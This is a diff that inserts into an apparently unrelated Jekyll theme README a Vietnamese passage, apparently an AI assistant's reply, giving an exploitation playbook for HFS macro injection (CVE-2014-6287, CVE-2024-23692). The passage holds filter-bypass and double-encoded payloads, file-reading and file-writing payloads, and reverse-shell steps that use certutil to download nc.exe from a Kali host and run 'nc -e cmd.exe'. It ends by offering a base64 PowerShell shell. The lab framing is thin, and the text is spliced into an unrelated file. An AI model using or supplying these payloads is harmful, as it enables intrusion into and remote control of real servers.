@@ -295,6 +295,88 @@ Mẹo thu hẹp mục tiêu: Nếu bạn gửi payload không chứa %00 mà ser
 • Hệ điều hành của máy chủ HFS trong lab là Windows hay chạy qua Wine trên Linux?
 Từ đó tôi có thể cung cấp đoạn script test tự động hoặc câu lệnh chính xác cho môi trường của bạn.
 
+Để giúp bạn thực hiện pentest chuyên sâu trong lab, dưới đây là danh mục các biến thể payload nâng cao (phòng trường hợp server cấu hình WAF hoặc filter lạ) và workflow (quy trình xử lý) chi tiết từng bước cho cả 2 kịch bản thành công và thất bại.
+
+PHẦN 1: CÁC BIẾN THỂ PAYLOAD (EVASION & ALTERNATIVES)
+
+Nếu các payload cơ bản ở lượt trước bị chặn hoặc không phản hồi, hãy thử các biến thể cấu trúc macro của HFS dưới đây:
+
+1. Biến thể bypass bộ lọc ký tự bằng cách chia nhỏ chuỗi (String Concatenation)
+
+HFS cho phép ghép chuỗi bằng macro {.^.}. Nếu từ khóa cmd hoặc exec bị tường lửa chặn, bạn có thể cắt nhỏ chúng:
+• Payload: /?search={.%65xec|c%6dd.exe /c ping -n 5 127.0.0.1.}
+• Hoặc dùng macro ghép: /?search={.exec|{.^c.}md.exe /c ping -n 5 127.0.0.1.}
+
+2. Biến thể sử dụng các Macro hệ thống khác thay vì {.exec.}
+
+Nếu {.exec.} bị vô hiệu hóa hoặc bị lọc, HFS 2.3 còn hỗ trợ các macro tương tác file/hệ thống khác:
+• Đọc file cấu hình hệ thống (Response-based):
+/?search={.load|C:\Windows\win.ini.} (Nếu thành công, nội dung file win.ini sẽ in ra ngay trên giao diện web).
+• Lấy thông tin phiên bản HFS nội bộ:
+/?search={.version.} hoặc /?search={.g|version.}
+
+3. Biến thể Encode nâng cao (Dành cho CVE-2024-23692)
+
+Đôi khi việc gửi trực tiếp dấu ngoặc nhọn {} trong URL bị máy chủ HTTP trả về lỗi 400 Bad Request. Bạn cần thử các kiểu encode:
+• Double URL Encode (Vượt qua WAF/Reverse Proxy đứng trước HFS):
+	• Dấu { chuyển thành %257B
+	• Dấu } chuyển thành %257D
+	• Dấu | chuyển thành %257C
+	• Payload: /?search=%257B.exec%257Cping%2520-n%25205%2520127.0.0.1.%257D
+
+PHẦN 2: WORKFLOW CHI TIẾT CHO PENTESTER
+
+Dưới đây là sơ đồ tư duy hành động (Playbook) khi bạn tiến hành test trong Lab bằng Burp Suite hoặc Python.
+
+Kịch bản A: KHI KHÔNG THÀNH CÔNG (Payload bị từ chối / Không có hành vi lạ)
+
+Khi bạn gửi payload mà server phản hồi bình thường lập tức, hoặc trả về lỗi, hãy làm theo workflow sau:
+[Gửi Payload] ──> Không có phản hồi trễ / Không thực thi
+    │
+    ├──> Bước A1: Kiểm tra mã HTTP phản hồi (Status Code)
+    │     ├──> Lỗi 400 Bad Request: Server không nhận ký tự đặc biệt ({, |, %).
+    │     │    └──> HÀNH ĐỘNG: Chuyển sang dùng Double URL Encode (Phần 1.3).
+    │     │
+    │     ├──> Lỗi 403 Forbidden / 406 Not Acceptable: Bị WAF hoặc cơ chế bảo vệ chặn.
+    │     │    └──> HÀNH ĐỘNG: Áp dụng các biến thể chia nhỏ chuỗi (Phần 1.1) hoặc đổi tham số sang `?S=` thay vì `?search=`.
+    │     │
+    │     └──> Mã 200 OK nhưng trang web hiển thị bình thường.
+    │          └──> HÀNH ĐỘNG: Chuyển sang Bước A2.
+    │
+    ├──> Bước A2: Xác định lại cơ chế (Null Byte check)
+    │     └──> Có thể server thuộc nhóm CVE-2014-6287 (yêu cầu nghiêm ngặt ký tự Null).
+    │          └──> HÀNH ĐỘNG: Chèn thêm `%00` vào trước `{` ở TẤT CẢ các biến thể trên.
+    │
+    └──> Bước A3: Kiểm tra quyền thực thi lệnh trên Windows Lab
+          └──> Có thể lệnh chạy được nhưng quyền User chạy HFS bị giới hạn (không gọi được `cmd.exe`).
+               └──> HÀNH ĐỘNG: Thử payload đọc file `{.load|C:\windows\win.ini.}` để xem đó là lỗi "chặn RCE" hay lỗi "chặn thực thi tiến trình con".
+
+Kịch bản B: KHI THÀNH CÔNG (Xác nhận có lỗ hổng)
+
+Khi bạn thấy Server bị trễ (Time-based thành công) hoặc trả về số 2 / nội dung file win.ini (Response-based thành công), mục tiêu tiếp theo trong lab là Khai thác mở rộng (Post-Exploitation) an toàn.
+[Xác nhận Vuln] ──> Server dính lỗ hổng bảo mật
+    │
+    ├──> Bước B1: Kiểm tra đặc quyền (Privilege Check)
+    │     └──> Gửi payload ghi một file text vào thư mục web công khai để xem quyền ghi:
+    │          `/?search={.save|test.txt|Vuln-Confirmed.}`
+    │     └──> Truy cập `http://<IP_Server>:<Port>/test.txt`. 
+    │          Nếu đọc được chữ "Vuln-Confirmed", bạn có quyền Ghi (Write access).
+    │
+    ├──> Bước B2: Độc lập hóa tiến trình (Tối ưu hóa Lab)
+    │     └──> Tránh việc chạy lệnh làm treo service `hfs.exe`.
+    │     └──> HÀNH ĐỘNG: Khi gọi lệnh Windows, luôn thêm `start /b` hoặc `cmd /c` để lệnh chạy ngầm ở background, không chiếm dụng thread của web server.
+    │
+    └──> Bước B3: Nâng cấp lên Reverse Shell (Chiếm quyền điều khiển trong lab)
+          ├──> Cách 1 (Dùng PowerShell mã hóa Base64 để tránh lỗi ký tự):
+          │    `/?search={.exec|powershell.exe -e <MÃ_BASE64_REVERSE_SHELL>.}`
+          └──> Cách 2 (Tải file mã độc test từ máy Kali về chạy):
+               `/?search={.exec|cmd.exe /c certutil.exe -urlcache -f http://<IP_Kali>/nc.exe C:\Windows\Temp\nc.exe.}`
+               Sau đó kích hoạt: `/?search={.exec|C:\Windows\Temp\nc.exe <IP_Kali> <Port> -e cmd.exe.}`
+
+Mẹo quan sát trực quan nhất trong Lab:
+
+Nếu bạn có quyền điều khiển màn hình máy Target (Windows), hãy bật công cụ Process Hacker hoặc Process Explorer. Khi bạn gửi payload thành công, bạn sẽ thấy tiến trình hfs.exe đẻ ra một tiến trình con là cmd.exe hoặc powershell.exe. Nếu thấy chúng xuất hiện rồi biến mất (hoặc chạy ngầm), bạn đã pentest thành công 100% dựa trên hành vi thực tế.
+Trong lab của bạn, mục tiêu cuối cùng của bạn là chỉ dừng lại ở mức chứng minh lỗ hổng (PoC) hay muốn leo thang đặc quyền / lấy Reverse Shell thành công? Nếu cần, tôi có thể cung cấp đoạn đóng gói mã hóa Base64 PowerShell tương thích hoàn toàn với cấu trúc macro của HFS để bạn test shell.
 
 I'd also like to thank [Dr. Jekyll's Themes](https://drjekyllthemes.github.io/), [Jekyll Themes](http://jekyllthemes.org/), and another [Jekyll Themes](http://jekyllrc.github.io/jekyllthemes/) for featuring Beautiful Jekyll in their Jekyll theme directories.
 
